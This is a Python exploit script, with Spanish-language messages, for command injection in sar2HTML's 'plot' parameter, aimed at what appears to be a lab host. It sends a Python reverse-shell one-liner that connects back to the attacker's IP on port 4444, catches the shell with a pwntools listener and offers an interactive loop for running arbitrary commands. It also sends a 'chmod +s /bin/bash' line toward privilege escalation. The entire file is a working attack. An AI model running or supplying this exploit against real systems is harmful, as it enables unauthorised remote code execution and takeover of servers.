import requests
import re
import time, sys, signal
from pwn import *
import threading

def def_handler(sug, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# variables globales
main_url = "http://192.168.199.35/sar2HTML/index.php?plot=;"
command = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.199",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""


def exploit():
	requests.get(main_url+command)

def rce():
	while(True):
		payload = input("> ")

		url = main_url + payload
		s = requests.get(url)

		out = re.findall("<option value=(.*?)>", s.text)

		for item in out:
			if "There is no defined host..." not in item:
				if "null selected" not in item:
					print(item)

if __name__=="__main__":
	try:
		threading.Thread(target=exploit, args=()).start()
	except:
		print("[!] Error")

	shell = listen(4444, timeout=20).wait_for_connection()

	if shell.sock is None:
		print("No se ha ganado acceso al sistema")
	else:
		print("Se ha ganado acceso al sistema")
		time.sleep(2)

	shell.sendline("echo 'chmod +s /bin/bash'")
	# time 5 min
	shell.interactive()
